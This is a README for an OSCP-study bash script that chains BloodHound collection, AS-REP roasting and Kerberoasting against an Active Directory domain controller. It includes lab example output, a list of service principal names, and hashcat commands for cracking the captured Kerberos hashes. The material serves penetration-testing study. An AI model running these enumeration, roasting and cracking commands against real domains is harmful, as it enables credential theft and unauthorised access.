# firstbl00d
A script to combine several AD commands to be run in one fell swoop.  
The reason I created this file was that when I was studying for my OSCP, I realised that to perform the bloodhound collection, AS-REP roasting and Kerberoasting from Kali linux, the same credentials were needed for each.  
**This script only automates the three tools used and allowed in the OSCP exam, so therefore should be allowed in the exam!**  
Have fun, and any feedback will be much appreciated! :)  

First Bl00d - a gerbil Production.

Author: gerbil  
v1.2 - 20260929

Simply rolls bloodhound-ce-python, impacket-GetNPUsers and impacket-GetUserSPNs into a single command.  
Bloodhound data is automatically zipped up ready to be pasted into Bloodhound.  
Also eliminates clock skews by basing time on that of the DC.  
NOTE: AI wasn't used in any part of this code! :)  

## Requirements  
For this to work properly the following need to be installed:


**faketime**  
  Homepage: https://github.com/wolfcw/libfaketime  
  Install: ```sudo apt install faketime```  

  
**bloodhound-ce-python**  
    Homepage: https://www.kali.org/tools/bloodhound-ce-python/  
  Install: ```sudo apt install bloodhound-ce-python```  

**impacket-GetNPUsers**  
**impacket-GetUserSPNs**  
  Homepage: https://www.kali.org/tools/impacket-scripts/  
  Install: ```sudo apt install impacket-scripts```  

## Installation and running:  
This doesn't really need to be installed, the bash script can be run from anywhere. Be sure to set it to be executable.  
The following steps should suffice successful running:  
```
git clone https://github.com/gerbilbyte/firstbl00d.git
cd firstbl00d
chmod 755 firstbl00d.sh
```  

## How to use
Parameters:  
	-u|--user <username>	:	Username to use for login  
	-p|--pass <password>	:	The password to use  
	-d|--dom <domain>	:	The domain to use  
	--dc-ip <DC IP>  	:	The IP address of the DC  
	-h|--help		:	The help screen (these parameters)  

Usage:  
  ```./firstbl00d.sh -u|--user <username> -p|--pass <password> -d|--dom <domain> --dc-ip <dc-ip>```  
Example:  
  ```./firstbl00d.sh -u gerbil -p 'Password123!' -d gerb.lab --dc-ip 192.168.1.123```  

## Example output:
```
┌──(kali㉿kali)-[/tmp/firstbl00d]
└─$ ./firstbl00d.sh -u web_svc -p ReDaCtEd -d redacted.lab --dc-ip 10.10.130.140

User:web_svc  Password:ReDaCtEd  Domain:redacted.lab  DC-IP:10.10.130.140

Time of DC: Wed Sep 30 03:24:31 AM BST 2026

BLOODHOUND DATA: Running bloodhound-ce-python -ns 10.10.130.140 -d 'redacted.lab' -u 'web_svc' -p 'ReDaCtEd' -c all

INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: redacted.lab
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.redacted.lab:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.redacted.lab
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.redacted.lab
INFO: Found 31 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 6 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MS01.redacted.lab
INFO: Querying computer: MS02.redacted.lab
INFO: Querying computer: DC01.redacted.lab
INFO: Done in 00M 04S
  ...zipping up the data as redacted.lab_AD.zip
  adding: 20260930032431_computers.json (deflated 87%)
  adding: 20260930032431_containers.json (deflated 93%)
  adding: 20260930032431_domains.json (deflated 75%)
  adding: 20260930032431_gpos.json (deflated 85%)
  adding: 20260930032431_groups.json (deflated 95%)
  adding: 20260930032431_ous.json (deflated 90%)
  adding: 20260930032431_users.json (deflated 96%)

AS-REP ROASTING: Running impacket-GetNPUsers -dc-ip 10.10.130.140 -request -outputfile hashes.asreproast redacted.lab/web_svc:ReDaCtEd
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!

KERBEROASTING: Running impacket-GetUserSPNs -dc-ip 10.10.130.140 -request -outputfile hashes.kerberoast redacted.lab/web_svc:ReDaCtEd
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------  --------  --------------------------  --------------------------  ----------
MSSQL/MS02.redacted.lab  sql_svc            2022-12-05 13:49:44.637096  2022-11-10 11:15:51.783016             
HTTP/MS01.redacted.lab   web_svc            2022-11-11 07:11:19.795439  2022-11-14 14:29:47.826775             



[-] CCache file is not found. Skipping...

--=CRACK HASHES=--

AS-REP ROASTING:
hashcat -m 18200 redacted.lab_hashes.asreproast /usr/share/wordlists/rockyou.txt -r best64g.rule

KERBEROASTING:
hashcat -m 13100 redacted.lab_hashes.kerberoast /usr/share/wordlists/rockyou.txt -r best64g.rule


┌──(kali㉿kali)-[/tmp/firstbl00d]
└─$ ls -latr            
total 256
-rw-rw-r--  1 kali kali  1724 Sep 29 19:46 README.md
drwxrwxr-x  7 kali kali   240 Sep 29 19:46 .git
-rwxr-xr-x  1 kali kali  3473 Sep 29 19:46 firstbl00d.sh
-rw-rw-r--  1 kali kali 75370 Sep 29 20:24 20260930032431_users.json
-rw-rw-r--  1 kali kali 89560 Sep 29 20:24 20260930032431_groups.json
-rw-rw-r--  1 kali kali  4006 Sep 29 20:24 20260930032431_gpos.json
-rw-rw-r--  1 kali kali 10591 Sep 29 20:24 20260930032431_ous.json
-rw-rw-r--  1 kali kali 26099 Sep 29 20:24 20260930032431_containers.json
-rw-rw-r--  1 kali kali  3518 Sep 29 20:24 20260930032431_domains.json
-rw-rw-r--  1 kali kali  9856 Sep 29 20:24 20260930032431_computers.json
-rw-rw-r--  1 kali kali 14644 Sep 29 20:24 redacted.lab_AD.zip
drwxrwxr-x  3 kali kali   280 Sep 29 20:24 .
-rw-rw-r--  1 kali kali  4140 Sep 29 20:24 redacted.lab_hashes.kerberoast
drwxrwxrwt 15 root root   360 Sep 29 20:25 ..
```
